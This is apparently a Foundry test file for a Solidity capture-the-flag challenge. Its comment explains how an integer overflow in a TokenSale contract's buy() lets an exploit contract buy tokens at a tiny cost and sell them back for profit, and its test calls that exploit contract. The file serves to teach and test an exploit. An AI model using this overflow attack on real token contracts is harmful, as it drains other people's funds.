// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {TokenSale, ExploitContract} from "../src/TokenSale.sol";

import {console} from "forge-std/console.sol";

/**
 * @title TokenSale Exploit Test
 * @notice Demonstrates exploitation of integer overflow in token purchase logic
 *
 * @dev The vulnerability exists because:
 * - The contract does not handle integer overflow when calculating the cost in `buy()`
 * - `ExploitContract` can buy tokens for an amount that overflows, resulting in a much lower actual cost
 *
 * Attack flow:
 * 1. `ExploitContract` interacts with `TokenSale`
 * 2. Calls `buy()` with a number of tokens that causes the total cost to overflow, resulting in an incorrect cost
 * 3. After buying tokens at the incorrect price, `ExploitContract` can sell the tokens back at the correct price, extracting profit
 */
interface IToken {
    function balanceOf(address owner) external view returns (uint256);
}

contract TokenSaleTest is Test {
    TokenSale public tokenSale;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        tokenSale = (new TokenSale){value: 1 ether}();
        exploitContract = new ExploitContract(tokenSale);
        vm.deal(address(exploitContract), 4 ether);
    }

    // Use the instance of tokenSale and exploitContract
    function testIncrement() public {
        // Put your solution here
        exploitContract.buyTokens();
        exploitContract.sellTokens();

        _checkSolved();
    }

    function _checkSolved() internal view {
        assertTrue(tokenSale.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
